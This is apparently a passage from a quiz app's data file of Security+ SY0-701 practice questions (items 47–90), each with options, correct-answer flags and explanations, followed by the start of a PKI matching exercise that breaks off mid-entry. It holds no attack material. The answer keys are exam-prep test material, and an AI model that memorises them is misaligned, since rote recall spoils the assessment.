{"n":47,"q":"Replacing real customer PII with realistic but fake values for use in a development environment is called:","opts":[{"l":"A","t":"Hashing","c":false,"w":"Hashing is one-way — useful for verification, not for keeping the data usable in dev."},{"l":"B","t":"Tokenization or data masking","c":true,"w":"Masking/tokenization replaces sensitive values with surrogates while preserving format and usability. Industry-standard for non-prod environments."},{"l":"C","t":"Compression","c":false,"w":"Compression reduces size; it doesn't substitute values."},{"l":"D","t":"Steganography","c":false,"w":"Steganography hides data inside other data. Different goal entirely."}],"topic":"SY0-701, Objective 3.3 - Protecting Data","url":"https://professormesser.link/701030303","objective":"3.3","domain":"3"},
{"n":48,"q":"PII, PHI, and PCI data each have what in common from a security policy standpoint?","opts":[{"l":"A","t":"They are all entirely public","c":false,"w":"Opposite — they're all sensitive."},{"l":"B","t":"Each is regulated, with specific handling and breach-notification requirements","c":true,"w":"PII (general), PHI (HIPAA), and PCI (PCI-DSS) all come with regulatory regimes that impose handling, encryption, retention, and breach-reporting duties."},{"l":"C","t":"All three require multi-factor authentication for any access","c":false,"w":"MFA is best practice, but not a literal requirement under every framework universally."},{"l":"D","t":"They can be safely emailed if password-protected","c":false,"w":"Password-protected email isn't sufficient for any of these."}],"topic":"SY0-701, Objective 3.3 - Data Types and Classifications","url":"https://professormesser.link/701030301","objective":"3.3","domain":"3"},
{"n":49,"q":"Which RAID level provides striping with distributed parity and can tolerate the loss of one disk?","opts":[{"l":"A","t":"RAID 0","c":false,"w":"RAID 0 is striping with no parity. One disk loss = total data loss."},{"l":"B","t":"RAID 1","c":false,"w":"RAID 1 is mirroring. Tolerates one disk loss, but it's mirroring, not parity."},{"l":"C","t":"RAID 5","c":true,"w":"RAID 5 = striping plus distributed parity across all disks. Tolerates exactly one disk loss."},{"l":"D","t":"RAID 6","c":false,"w":"Tempting — RAID 6 has DOUBLE parity and tolerates TWO disk losses. The question specifies one."}],"topic":"SY0-701, Objective 3.4 - Resiliency","url":"https://professormesser.link/701030402","objective":"3.4","domain":"3"},
{"n":50,"q":"The RPO (Recovery Point Objective) for a system is 1 hour. What does this mean in practice?","opts":[{"l":"A","t":"The system must come back online within 1 hour after a failure","c":false,"w":"That's RTO (Recovery Time Objective)."},{"l":"B","t":"Data older than 1 hour must be archived offsite","c":false,"w":"Not what RPO measures."},{"l":"C","t":"The maximum tolerable data loss is 1 hour's worth","c":true,"w":"RPO defines how far back in time data can be lost. A 1-hour RPO means backups (or replication) must happen at least hourly."},{"l":"D","t":"The system needs at least 1 hour of uptime per day","c":false,"w":"Not an SLA-style metric in this form."}],"topic":"SY0-701, Objective 3.4 - Business Impact Analysis","url":"https://professormesser.link/701050204","objective":"3.4","domain":"3"},
{"n":51,"q":"A facility uses a generator AND a UPS for power resilience. Why both?","opts":[{"l":"A","t":"Redundancy in case one fails entirely","c":false,"w":"Partial answer — but the specific reason combines them is about coverage gap."},{"l":"B","t":"The UPS covers the seconds-to-minutes gap until the generator starts and stabilizes","c":true,"w":"Generators take 10-30 seconds to start and stabilize. The UPS bridges that gap so loads see no interruption."},{"l":"C","t":"The UPS provides longer runtime than the generator","c":false,"w":"Generators run much longer than UPS batteries — opposite ranking."},{"l":"D","t":"Both serve identical functions; one is purely cosmetic","c":false,"w":"They serve complementary functions."}],"topic":"SY0-701, Objective 3.4 - Resiliency","url":"https://professormesser.link/701030402","objective":"3.4","domain":"3"},
{"n":52,"q":"A regional disaster destroys the primary data center. The organization activates a secondary site that already runs identical infrastructure and continuously receives replicated data, capable of taking traffic immediately. This is a:","opts":[{"l":"A","t":"Cold site","c":false,"w":"Cold sites have power and floor space but no running infrastructure. Days-to-weeks recovery."},{"l":"B","t":"Warm site","c":false,"w":"Warm sites have infrastructure but data is stale. Hours-to-days recovery."},{"l":"C","t":"Hot site","c":true,"w":"Hot sites mirror production, run live, and can take traffic in minutes. Most expensive but lowest RTO/RPO."},{"l":"D","t":"Alternative cloud region","c":false,"w":"Tempting modern equivalent, but the term the exam wants is 'hot site.'"}],"topic":"SY0-701, Objective 3.4 - Resiliency","url":"https://professormesser.link/701030402","objective":"3.4","domain":"3"},
{"n":53,"q":"A SaaS calendar provider runs all the underlying infrastructure, runtime, and application. The customer only configures their tenant. Under the shared responsibility model, who is responsible for the APPLICATION's security patches?","opts":[{"l":"A","t":"The SaaS provider","c":true,"w":"In SaaS, the provider owns everything from infrastructure through application. Customer responsibility is configuration, access, and their data."},{"l":"B","t":"The customer","c":false,"w":"Customer can't patch a SaaS application — they don't have access to the code."},{"l":"C","t":"Shared, with each picking specific CVEs to handle","c":false,"w":"Not how SaaS works in practice."},{"l":"D","t":"The customer's IT staff via a third-party plugin","c":false,"w":"Plugins are the customer's responsibility, but core application patching is the provider's."}],"topic":"SY0-701, Objective 3.1 - Cloud Infrastructures","url":"https://professormesser.link/701030101","objective":"3.1","domain":"3"},
{"n":54,"q":"Which control most directly reduces the risk that a lost or stolen company laptop becomes a data-breach incident?","opts":[{"l":"A","t":"Strong wireless WPA3 configuration on the office network","c":false,"w":"WPA3 protects the network, not the device once it's away."},{"l":"B","t":"Full-disk encryption with pre-boot authentication","c":true,"w":"FDE makes the disk contents unreadable without the key. Lost laptops become wiped-bricks, not breaches."},{"l":"C","t":"Network access control on the corporate switch ports","c":false,"w":"NAC controls who plugs into the corporate LAN. Doesn't help once the laptop is gone."},{"l":"D","t":"Anti-spam filtering on the mail gateway","c":false,"w":"Email hygiene is unrelated to physical loss."}],"topic":"SY0-701, Objective 4.1 - Securing Endpoints","url":"https://professormesser.link/701040101","objective":"4.1","domain":"4"},
{"n":55,"q":"An MDM enforces that company iPads cannot install applications from outside the corporate app catalog. This is BEST described as:","opts":[{"l":"A","t":"Containerization","c":false,"w":"Containerization isolates work data from personal — related but distinct from app restrictions."},{"l":"B","t":"Application allow-listing","c":true,"w":"Restricting installations to an approved catalog is allow-listing applied to mobile."},{"l":"C","t":"Geofencing","c":false,"w":"Geofencing applies controls based on physical location."},{"l":"D","t":"Jailbreaking","c":false,"w":"Jailbreaking REMOVES restrictions. Opposite of what's described."}],"topic":"SY0-701, Objective 4.1 - Securing Wireless and Mobile","url":"https://professormesser.link/701040103","objective":"4.1","domain":"4"},
{"n":56,"q":"Choose Your Own Device (CYOD) is BEST described as:","opts":[{"l":"A","t":"Employees buy devices on the open market and use them at work without IT oversight","c":false,"w":"That's BYOD with weak governance."},{"l":"B","t":"IT publishes a catalog of approved devices; employees pick one, and the company owns and manages it","c":true,"w":"CYOD = constrained choice within an approved list, company-owned. Balances user preference with management control."},{"l":"C","t":"Employees rent devices from a third party","c":false,"w":"Not the model."},{"l":"D","t":"IT chooses one device for everyone with no input from employees","c":false,"w":"That's COPE/COBO territory — not CYOD."}],"topic":"SY0-701, Objective 4.1 - Securing Wireless and Mobile","url":"https://professormesser.link/701040103","objective":"4.1","domain":"4"},
{"n":57,"q":"An asset management team paints serial-number labels on every laptop, monitor, and projector, and records each in a central database with current assignee. This practice is BEST described as:","opts":[{"l":"A","t":"Decommissioning","c":false,"w":"Decommissioning is the end-of-life process. This is mid-life tracking."},{"l":"B","t":"Asset tagging and inventory","c":true,"w":"Labeling, recording, and assigning ownership of physical assets is the core of asset inventory management."},{"l":"C","t":"Data classification","c":false,"w":"That's a different exercise — classifying data, not physical assets."},{"l":"D","t":"Patch management","c":false,"w":"Patch management tracks software updates, not physical assets."}],"topic":"SY0-701, Objective 4.2 - Asset Management","url":"https://professormesser.link/701040201","objective":"4.2","domain":"4"},
{"n":58,"q":"Before disposing of an old hard drive containing sensitive customer data, the recommended approach is:","opts":[{"l":"A","t":"Delete the files and recycle the drive","c":false,"w":"File deletion doesn't remove the data — just the index entry. Recoverable trivially."},{"l":"B","t":"Physically destroy the drive (shred or degauss) or perform a verified sanitization wipe","c":true,"w":"For sensitive data, physical destruction or a verified multi-pass overwrite is required. Verification matters."},{"l":"C","t":"Reformat the drive once","c":false,"w":"Quick formats don't overwrite data. Recoverable."},{"l":"D","t":"Encrypt the drive and then donate it","c":false,"w":"Encryption protects on-system, but giving the drive away with the keys still recoverable elsewhere is risky."}],"topic":"SY0-701, Objective 4.2 - Asset Disposal","url":"https://professormesser.link/701040202","objective":"4.2","domain":"4"},
{"n":59,"q":"A monthly vulnerability scan reports 247 findings against the production fleet. The team has bandwidth to remediate 30 this sprint. Which factor is MOST useful for prioritization?","opts":[{"l":"A","t":"Alphabetical order of CVE identifiers","c":false,"w":"Alphabetical ordering has no security meaning."},{"l":"B","t":"CVSS score combined with exploitability and asset criticality","c":true,"w":"Severity (CVSS), known exploitation in the wild, and the importance of the affected asset together drive sensible triage."},{"l":"C","t":"Disk space consumed by the affected service","c":false,"w":"Disk usage is unrelated to security risk."},{"l":"D","t":"Order in which the scanner reported them","c":false,"w":"Scanner ordering is arbitrary."}],"topic":"SY0-701, Objective 4.3 - Vulnerability Management","url":"https://professormesser.link/701040301","objective":"4.3","domain":"4"},
{"n":60,"q":"Which type of testing involves an external team simulating a real attacker with no prior knowledge of the target environment?","opts":[{"l":"A","t":"White-box / known-environment penetration test","c":false,"w":"White-box testers receive full information."},{"l":"B","t":"Gray-box / partially-known penetration test","c":false,"w":"Gray-box gets partial info — like an authenticated user's view."},{"l":"C","t":"Black-box / unknown-environment penetration test","c":true,"w":"Black-box mirrors a real outside attacker's starting position: name of the company, maybe a domain, and nothing else."},{"l":"D","t":"Vulnerability scan","c":false,"w":"Vulnerability scans are automated and non-exploitative. Pentests actively try to exploit."}],"topic":"SY0-701, Objective 4.3 - Penetration Testing","url":"https://professormesser.link/701040303","objective":"4.3","domain":"4"},
{"n":61,"q":"A SOC analyst tunes a correlation rule to fire only when a single user account fails authentication from three or more different countries within an hour. This rule pattern is BEST described as:","opts":[{"l":"A","t":"Signature detection","c":false,"w":"Signature detection matches known indicators (a hash, a specific string). This is behavioral."},{"l":"B","t":"Anomaly / behavior-based detection","c":true,"w":"Looking for unusual patterns (geographically impossible logins) is behavior/anomaly detection."},{"l":"C","t":"Threshold logging","c":false,"w":"Pure thresholds are simpler — N events in T time. The geography correlation adds behavior context."},{"l":"D","t":"Threat intelligence sharing","c":false,"w":"Threat intel sharing is feeds and lists. Not detection logic itself."}],"topic":"SY0-701, Objective 4.4 - Security Monitoring","url":"https://professormesser.link/701040401","objective":"4.4","domain":"4"},
{"n":62,"q":"Which platform AGGREGATES logs from many sources, correlates them, and provides search and alerting?","opts":[{"l":"A","t":"DLP","c":false,"w":"DLP focuses on data movement. Not a log aggregator."},{"l":"B","t":"SIEM","c":true,"w":"Security Information and Event Management = the log aggregation + correlation + alerting platform."},{"l":"C","t":"HSM","c":false,"w":"HSMs manage keys. Different appliance."},{"l":"D","t":"IPS","c":false,"w":"IPS inspects traffic in line. Logs into a SIEM but isn't one."}],"topic":"SY0-701, Objective 4.4 - Security Tools","url":"https://professormesser.link/701040402","objective":"4.4","domain":"4"},
{"n":63,"q":"A SOAR platform's primary value-add over a SIEM is:","opts":[{"l":"A","t":"Storing more logs for longer","c":false,"w":"Storage scaling is a SIEM/data-lake feature."},{"l":"B","t":"Automating response workflows (playbooks) so detection-to-action becomes machine-speed","c":true,"w":"SOAR = Security Orchestration, Automation, and Response. Codifies repeatable response steps as runnable playbooks."},{"l":"C","t":"Eliminating the need for analysts","c":false,"w":"SOAR augments analysts — it doesn't replace judgment."},{"l":"D","t":"Encrypting logs at rest","c":false,"w":"Encryption is table-stakes; it's not the SOAR differentiator."}],"topic":"SY0-701, Objective 4.4 - Security Tools","url":"https://professormesser.link/701040402","objective":"4.4","domain":"4"},
{"n":64,"q":"A company deploys an inbound email gateway that quarantines messages with suspicious links and attachments. Which capability is this?","opts":[{"l":"A","t":"DLP outbound","c":false,"w":"DLP focuses on data leaving the organization."},{"l":"B","t":"Email content filtering / secure email gateway","c":true,"w":"Inbound email filtering with link/attachment analysis is the SEG (secure email gateway) capability."},{"l":"C","t":"NTP filtering","c":false,"w":"NTP is time synchronization — unrelated."},{"l":"D","t":"BGP filtering","c":false,"w":"BGP is internet routing."}],"topic":"SY0-701, Objective 4.5 - Email Security","url":"https://professormesser.link/701040505","objective":"4.5","domain":"4"},
{"n":65,"q":"Which trio of DNS-based mechanisms work together to fight email impersonation?","opts":[{"l":"A","t":"SPF, DKIM, DMARC","c":true,"w":"SPF authorizes sending hosts. DKIM signs message content. DMARC tells receivers what to do with failures and provides reporting."},{"l":"B","t":"SMTP, IMAP, POP3","c":false,"w":"Those are email transport/retrieval protocols, not anti-spoofing."},{"l":"C","t":"NTP, NetBIOS, NFS","c":false,"w":"None of those are email-related."},{"l":"D","t":"SAML, OAuth, OIDC","c":false,"w":"Federation/authorization protocols. Different problem domain."}],"topic":"SY0-701, Objective 4.5 - Email Security","url":"https://professormesser.link/701040505","objective":"4.5","domain":"4"},
{"n":66,"q":"Outbound DLP rules detect that an employee just attempted to email a spreadsheet containing 600 credit card numbers to a personal address. The system blocks the message. Which control type is this?","opts":[{"l":"A","t":"Preventive / technical","c":true,"w":"DLP that actively blocks (not just alerts) is preventive. Implemented in software, so technical."},{"l":"B","t":"Detective / managerial","c":false,"w":"It blocked, so it's preventive, not detective; managerial would be policy-only."},{"l":"C","t":"Compensating / physical","c":false,"w":"Neither axis fits."},{"l":"D","t":"Directive / operational","c":false,"w":"Neither axis fits."}],"topic":"SY0-701, Objective 4.5 - Email Security","url":"https://professormesser.link/701040505","objective":"4.5","domain":"4"},
{"n":67,"q":"Multi-factor authentication is defined as authentication requiring elements from TWO or more of which categories?","opts":[{"l":"A","t":"Three passwords of varying length","c":false,"w":"Three things you KNOW is still one factor — knowledge."},{"l":"B","t":"Something you know, something you have, something you are, somewhere you are","c":true,"w":"True MFA requires factors from DIFFERENT categories, not multiple things in the same category."},{"l":"C","t":"Three biometric scans","c":false,"w":"Three things you ARE is still one factor."},{"l":"D","t":"Same factor type from two devices","c":false,"w":"Doesn't satisfy the 'different factor types' requirement."}],"topic":"SY0-701, Objective 4.6 - Multi-factor Authentication","url":"https://professormesser.link/701040603","objective":"4.6","domain":"4"},
{"n":68,"q":"RBAC differs from ABAC in that RBAC grants permissions based on:","opts":[{"l":"A","t":"The current attributes of the requesting subject and resource (location, time, classification, etc.)","c":false,"w":"That's ABAC."},{"l":"B","t":"The job role assigned to the user","c":true,"w":"Role-based access control attaches permissions to roles. Users get permissions by being assigned roles. Simpler but coarser than ABAC."},{"l":"C","t":"The discretion of the data owner","c":false,"w":"That's DAC — discretionary access control."},{"l":"D","t":"A government-issued security clearance level","c":false,"w":"That's MAC — mandatory access control with classifications."}],"topic":"SY0-701, Objective 4.6 - Access Controls","url":"https://professormesser.link/701040602","objective":"4.6","domain":"4"},
{"n":69,"q":"A user logs into multiple SaaS apps using their work email and a single corporate identity provider. They authenticate once per day. This is an example of:","opts":[{"l":"A","t":"Federation with SSO","c":true,"w":"Federation (trusting another party's identity assertions) combined with SSO (one auth, many services) is the standard pattern."},{"l":"B","t":"Password rotation","c":false,"w":"Password rotation is changing passwords periodically — unrelated."},{"l":"C","t":"Multi-factor authentication","c":false,"w":"MFA is about authentication strength, not session sharing across services."},{"l":"D","t":"Privileged access management","c":false,"w":"PAM is for admin/privileged accounts specifically."}],"topic":"SY0-701, Objective 4.6 - Identity and Access Management","url":"https://professormesser.link/701040601","objective":"4.6","domain":"4"},
{"n":70,"q":"A PAM (Privileged Access Management) tool typically does which of the following? (Select TWO)","opts":[{"l":"A","t":"Stores privileged credentials in an encrypted vault and rotates them automatically","c":true,"w":"Vaulting and rotation are core PAM capabilities."},{"l":"B","t":"Records sessions opened with privileged accounts","c":true,"w":"Session recording is the other half — auditability when sensitive creds are used."},{"l":"C","t":"Replaces the need for any service accounts","c":false,"w":"PAM manages service accounts; it doesn't eliminate them."},{"l":"D","t":"Encrypts all employee email","c":false,"w":"Out of scope — that's a mail-gateway function."},{"l":"E","t":"Issues TLS certificates","c":false,"w":"Certificate issuance is PKI/CA work, not PAM."}],"topic":"SY0-701, Objective 4.6 - Identity and Access Management","url":"https://professormesser.link/701040601","objective":"4.6","domain":"4"},
{"n":71,"q":"An automation playbook fires on every high-severity SIEM alert: it pulls related logs, queries threat intel feeds, and opens a ticket pre-populated with context. The MOST direct benefit is:","opts":[{"l":"A","t":"Eliminating false positives","c":false,"w":"Automation doesn't eliminate false positives by itself — it just speeds enrichment."},{"l":"B","t":"Reducing analyst toil and mean-time-to-respond","c":true,"w":"Automating the routine first-touch work lets analysts focus on judgment-heavy work and lowers MTTR."},{"l":"C","t":"Replacing the SIEM","c":false,"w":"It complements, doesn't replace."},{"l":"D","t":"Encrypting data at rest","c":false,"w":"Unrelated capability."}],"topic":"SY0-701, Objective 4.7 - Scripting and Automation","url":"https://professormesser.link/701040701","objective":"4.7","domain":"4"},
{"n":72,"q":"Why might a security team avoid embedding API keys directly in automation scripts?","opts":[{"l":"A","t":"Scripts run too slowly when keys are inline","c":false,"w":"Performance isn't the issue."},{"l":"B","t":"Inline secrets get committed to source control, leaked in logs, and rotated rarely","c":true,"w":"Hard-coded credentials are a well-known security debt. Secrets belong in vaults / managed-identity services with rotation."},{"l":"C","t":"API keys don't work in scripts","c":false,"w":"They do."},{"l":"D","t":"Cloud providers automatically deny inline keys","c":false,"w":"They don't — but it's a top-of-the-list practice violation."}],"topic":"SY0-701, Objective 4.7 - Scripting and Automation","url":"https://professormesser.link/701040701","objective":"4.7","domain":"4"},
{"n":73,"q":"The first action during the containment phase of incident response on a compromised laptop is typically:","opts":[{"l":"A","t":"Wipe the disk and reimage","c":false,"w":"That's eradication/recovery. Skipping containment loses forensic evidence."},{"l":"B","t":"Disconnect the laptop from networks (isolate)","c":true,"w":"Isolation stops further damage and lateral movement without destroying state. Forensics-friendly containment."},{"l":"C","t":"Run a full antivirus scan","c":false,"w":"AV scanning may alert the malware; isolate first."},{"l":"D","t":"Inform the press","c":false,"w":"Public communications are far downstream, if at all."}],"topic":"SY0-701, Objective 4.8 - Incident Response","url":"https://professormesser.link/701040801","objective":"4.8","domain":"4"},
{"n":74,"q":"Which of the following is NOT typically captured in an incident-response runbook?","opts":[{"l":"A","t":"Roles and escalation contacts","c":false,"w":"Always captured."},{"l":"B","t":"Communication templates for stakeholders, regulators, and customers","c":false,"w":"Usually captured."},{"l":"C","t":"Detailed marketing campaign launch plans","c":true,"w":"Marketing campaigns aren't part of IR runbooks. The other three answers are routine inclusions."},{"l":"D","t":"Decision criteria for invoking external counsel or law enforcement","c":false,"w":"Usually captured."}],"topic":"SY0-701, Objective 4.8 - Incident Response","url":"https://professormesser.link/701040801","objective":"4.8","domain":"4"},
{"n":75,"q":"After an incident is closed, the team holds a meeting to walk through what happened, what worked, and what to change. This is:","opts":[{"l":"A","t":"A tabletop exercise","c":false,"w":"Tabletop is a SIMULATED scenario walkthrough done proactively. This is post-incident."},{"l":"B","t":"A lessons-learned / post-incident review","c":true,"w":"Closing the loop on a real incident with a structured retrospective is the lessons-learned phase."},{"l":"C","t":"A penetration test debrief","c":false,"w":"Wrong context."},{"l":"D","t":"A change management approval meeting","c":false,"w":"Different process."}],"topic":"SY0-701, Objective 4.8 - Incident Response","url":"https://professormesser.link/701040801","objective":"4.8","domain":"4"},
{"n":76,"q":"A web server's access log shows a series of 401 responses for a single account followed by a successful 200. This pattern is MOST consistent with:","opts":[{"l":"A","t":"A normal user who fat-fingered their password","c":false,"w":"Possible but the volume question matters — single retry is normal, sustained 401s aren't."},{"l":"B","t":"A brute-force or credential-stuffing attack that eventually succeeded","c":true,"w":"Sustained failed authentications followed by success is the classic 'they got in eventually' signature."},{"l":"C","t":"A DDoS attack","c":false,"w":"DDoS doesn't normally show as authentication failures — it's about volume."},{"l":"D","t":"A misconfigured certificate","c":false,"w":"Cert issues throw different errors (SSL errors, 525-class). 401 is authentication."}],"topic":"SY0-701, Objective 4.9 - Log Files","url":"https://professormesser.link/701040901","objective":"4.9","domain":"4"},
{"n":77,"q":"An analyst notices that one Linux server's auth.log is conspicuously missing entries for a 4-hour window during which a compromise occurred. Most likely explanation:","opts":[{"l":"A","t":"The system was offline for that window","c":false,"w":"Offline systems generate startup/shutdown entries flanking the gap. None mentioned."},{"l":"B","t":"An attacker tampered with the log file to hide their activity","c":true,"w":"Selective log gaps in an active system are a strong indicator of log tampering — an anti-forensic technique."},{"l":"C","t":"Routine log rotation","c":false,"w":"Rotation produces archived files, not gaps."},{"l":"D","t":"Daylight savings time","c":false,"w":"DST shifts timestamps; it doesn't remove entries."}],"topic":"SY0-701, Objective 4.9 - Log Data","url":"https://professormesser.link/701040901","objective":"4.9","domain":"4"},
{"n":78,"q":"Why is centralizing logs to a SIEM more useful than reading logs on each host individually?","opts":[{"l":"A","t":"It uses less disk space","c":false,"w":"Centralization usually uses MORE disk space (copies), not less."},{"l":"B","t":"It enables cross-host correlation, retention beyond local rotation, and integrity protection","c":true,"w":"Correlation across hosts, longer retention than a host can keep, and tamper-resistance against local attackers are all wins."},{"l":"C","t":"Local logs don't have timestamps","c":false,"w":"They do."},{"l":"D","t":"It eliminates the need for backups","c":false,"w":"SIEM is not a backup."}],"topic":"SY0-701, Objective 4.9 - Log Data","url":"https://professormesser.link/701040901","objective":"4.9","domain":"4"},
{"n":79,"q":"Which of the following BEST describes a data owner versus a data custodian?","opts":[{"l":"A","t":"The data owner runs daily backups; the custodian sets retention policy","c":false,"w":"Reversed — owner sets policy, custodian operates."},{"l":"B","t":"The data owner is accountable for the data and defines policy; the custodian operationally enforces and maintains it","c":true,"w":"Owner = accountability and policy authority. Custodian = day-to-day handling, backup, restoration, access enforcement."},{"l":"C","t":"They are the same role with different names","c":false,"w":"Distinct roles."},{"l":"D","t":"Both are external auditors","c":false,"w":"Both are internal roles."}],"topic":"SY0-701, Objective 5.1 - Data Roles and Responsibilities","url":"https://professormesser.link/701050105","objective":"5.1","domain":"5"},
{"n":80,"q":"Acceptable use policies (AUPs) typically cover:","opts":[{"l":"A","t":"Specific firewall rule numbers used on the perimeter","c":false,"w":"That's an operational technical document, not an AUP."},{"l":"B","t":"What employees may and may not do with company systems, networks, and data","c":true,"w":"AUPs codify expected user behavior — appropriate uses, prohibited activity, monitoring disclosure."},{"l":"C","t":"Quarterly financial targets","c":false,"w":"Out of scope for security policy."},{"l":"D","t":"Insurance premium pricing","c":false,"w":"Out of scope."}],"topic":"SY0-701, Objective 5.1 - Security Policies","url":"https://professormesser.link/701050101","objective":"5.1","domain":"5"},
{"n":81,"q":"ALE (Annualized Loss Expectancy) is computed as:","opts":[{"l":"A","t":"SLE × ARO","c":true,"w":"Single Loss Expectancy times Annualized Rate of Occurrence. If one event costs $10K and you expect 3 per year, ALE = $30K."},{"l":"B","t":"SLE + ARO","c":false,"w":"Wrong operation."},{"l":"C","t":"SLE ÷ ARO","c":false,"w":"Wrong operation."},{"l":"D","t":"Asset value × exposure factor","c":false,"w":"Tempting — that's how you compute SLE itself, not ALE."}],"topic":"SY0-701, Objective 5.2 - Risk Analysis","url":"https://professormesser.link/701050202","objective":"5.2","domain":"5"},
{"n":82,"q":"A company purchases cyber insurance to cover potential breach costs. This is an example of:","opts":[{"l":"A","t":"Risk avoidance","c":false,"w":"Avoidance means not engaging with the risk at all — leaving the market entirely, for instance."},{"l":"B","t":"Risk acceptance","c":false,"w":"Acceptance is doing nothing and absorbing the loss if it occurs. Insurance is doing something."},{"l":"C","t":"Risk transfer","c":true,"w":"Insurance shifts the financial impact to a third party (the insurer). Classic risk transfer."},{"l":"D","t":"Risk mitigation","c":false,"w":"Mitigation reduces likelihood or impact directly — adding controls, not buying a policy."}],"topic":"SY0-701, Objective 5.2 - Risk Analysis","url":"https://professormesser.link/701050202","objective":"5.2","domain":"5"},
{"n":83,"q":"A risk register entry should contain, at minimum:","opts":[{"l":"A","t":"Just the name of the risk and the date it was added","c":false,"w":"Insufficient — no analysis."},{"l":"B","t":"Risk description, likelihood, impact, owner, mitigation status","c":true,"w":"Useful risk registers describe the risk, score it (likelihood × impact), assign accountability, and track what's being done."},{"l":"C","t":"All employee personal information","c":false,"w":"Risk registers shouldn't contain PII unless directly relevant — and even then, minimally."},{"l":"D","t":"Marketing campaign timing","c":false,"w":"Out of scope."}],"topic":"SY0-701, Objective 5.2 - Risk Analysis","url":"https://professormesser.link/701050202","objective":"5.2","domain":"5"},
{"n":84,"q":"Two organizations document the specific deliverables, milestones, and acceptance criteria for a one-time integration project. This document is BEST called a(n):","opts":[{"l":"A","t":"SLA","c":false,"w":"SLAs cover ongoing service performance commitments, not project deliverables."},{"l":"B","t":"SOW (Statement of Work)","c":true,"w":"Statements of Work define what will be done, in what timeframe, with what acceptance criteria. Project-scoped."},{"l":"C","t":"NDA","c":false,"w":"NDAs cover confidentiality, not deliverables."},{"l":"D","t":"MOA","c":false,"w":"MOAs are broader cooperation agreements — less specific than SOWs."}],"topic":"SY0-701, Objective 5.3 - Agreement Types","url":"https://professormesser.link/701050302","objective":"5.3","domain":"5"},
{"n":85,"q":"A supplier audit reveals that one of the vendor's subcontractors has access to your data and you didn't know. This risk class is called:","opts":[{"l":"A","t":"Supply chain / fourth-party risk","c":true,"w":"Risk extending through your supplier's suppliers — beyond direct (third-party) relationships — is the fourth-party / supply chain risk problem."},{"l":"B","t":"Account takeover","c":false,"w":"ATO is about credential compromise, not vendor relationships."},{"l":"C","t":"Phishing","c":false,"w":"Phishing is a delivery mechanism, not a risk class for vendor management."},{"l":"D","t":"Lateral movement","c":false,"w":"Lateral movement is what an attacker does once inside, not a vendor concept."}],"topic":"SY0-701, Objective 5.3 - Third-Party Risk","url":"https://professormesser.link/701050301","objective":"5.3","domain":"5"},
{"n":86,"q":"Which framework prescribes specific controls for protecting payment card data?","opts":[{"l":"A","t":"HIPAA","c":false,"w":"HIPAA covers protected health information in the US."},{"l":"B","t":"PCI-DSS","c":true,"w":"Payment Card Industry Data Security Standard is the prescriptive control framework for cardholder data."},{"l":"C","t":"FERPA","c":false,"w":"FERPA covers US student educational records."},{"l":"D","t":"SOX","c":false,"w":"Sarbanes-Oxley addresses financial reporting controls for public companies."}],"topic":"SY0-701, Objective 5.4 - Compliance","url":"https://professormesser.link/701050401","objective":"5.4","domain":"5"},
{"n":87,"q":"GDPR's 'right to erasure' (right to be forgotten) requires that:","opts":[{"l":"A","t":"Companies must delete user data immediately on any request, no exceptions","c":false,"w":"There are legitimate exceptions (legal hold, regulatory retention, etc.). It's not absolute."},{"l":"B","t":"Subjects can request deletion of their personal data, subject to specific lawful exceptions","c":true,"w":"GDPR Article 17. Subject-initiated erasure with defined exceptions for legal obligations, public interest, etc."},{"l":"C","t":"Companies must retain user data indefinitely","c":false,"w":"Opposite of erasure."},{"l":"D","t":"Only EU-headquartered companies are affected","c":false,"w":"GDPR applies based on subject location and goods/services offered, not just company HQ."}],"topic":"SY0-701, Objective 5.4 - Compliance and Privacy","url":"https://professormesser.link/701050402","objective":"5.4","domain":"5"},
{"n":88,"q":"An internal audit confirms that the financial reporting system meets SOX controls. Which control type does the audit ITSELF represent?","opts":[{"l":"A","t":"Preventive","c":false,"w":"Audits don't prevent — they verify."},{"l":"B","t":"Detective","c":true,"w":"Audits detect compliance gaps and control weaknesses. Findings come AFTER the fact."},{"l":"C","t":"Compensating","c":false,"w":"Audits don't substitute for missing controls."},{"l":"D","t":"Corrective","c":false,"w":"Audits identify; the remediation that follows is corrective."}],"topic":"SY0-701, Objective 5.5 - Audits and Assessments","url":"https://professormesser.link/701050501","objective":"5.5","domain":"5"},
{"n":89,"q":"A vulnerability scan is run with valid credentials so the scanner can inspect installed packages and configuration as a logged-in user would. This is:","opts":[{"l":"A","t":"An authenticated / credentialed scan","c":true,"w":"Authenticated scans see what's actually installed and configured, not just what's externally observable. Much higher fidelity."},{"l":"B","t":"A black-box penetration test","c":false,"w":"Pen tests actively exploit; scans don't. And black-box implies no credentials."},{"l":"C","t":"A red-team exercise","c":false,"w":"Red teams simulate adversaries holistically — far broader than a scan."},{"l":"D","t":"A tabletop exercise","c":false,"w":"Tabletops are scenario walkthroughs."}],"topic":"SY0-701, Objective 5.5 - Audits and Assessments","url":"https://professormesser.link/701050501","objective":"5.5","domain":"5"},
{"n":90,"q":"A quarterly internal phishing simulation is sent to all employees, and click-through statistics inform tailored follow-up training. The PRIMARY value of this program is:","opts":[{"l":"A","t":"Reducing the cost of email infrastructure","c":false,"w":"It doesn't affect infrastructure cost."},{"l":"B","t":"Measuring and improving security awareness over time","c":true,"w":"Phishing simulations give you a measurable behavioral baseline and let you track whether training is moving the needle."},{"l":"C","t":"Replacing the spam filter","c":false,"w":"Simulations don't replace filtering — they complement it."},{"l":"D","t":"Detecting outsider attackers in real time","c":false,"w":"That's the SIEM/IPS job, not awareness programs."}],"topic":"SY0-701, Objective 5.6 - Security Awareness","url":"https://professormesser.link/701050601","objective":"5.6","domain":"5"}
];

const pbqs = [
  {"n":1,"title":"PKI certificate components","type":"match","prompt":"A new web team is learning the moving parts of public-key infrastructure. Match each PKI element to the function it performs. Each element is used exactly once.","options":["CRL","OCSP","CA","CSR","OCSP stapling"],"items":[{"id":"1a","desc":"Browser asks 'is this cert still valid?' over a real-time request","answer":"OCSP","w":"OCSP is the per-cert real-time revocation check protocol; CRL is the bulk download alternative."},{"id":"1b","desc":"Bundle of revoked-certificate serial numbers, published by the issuer","answer":"CRL","w":"CRL = Certificate Revocation List. Downloaded periodically by clients; can grow large."},{"id":"1c","desc":"Issues and signs end-entity certificates inside a PKI","answer":"CA","w":"The Certificate Authority is the root of trust. Browsers trust certs because they chain to a trusted CA."},{"id":"1d","desc":"What the server sends to the CA to request a new certificate, containing the public key and identity info","answer":"CSR","w":"CSR = Certificate Signing Request. Server-generated, sent to CA, which returns a signed certificate."},{"id":"1e","desc":"Server attaches its own freshly-signed OCSP response inside the TLS handshake so the client doesn't have to ask the CA","answer":"OCSP 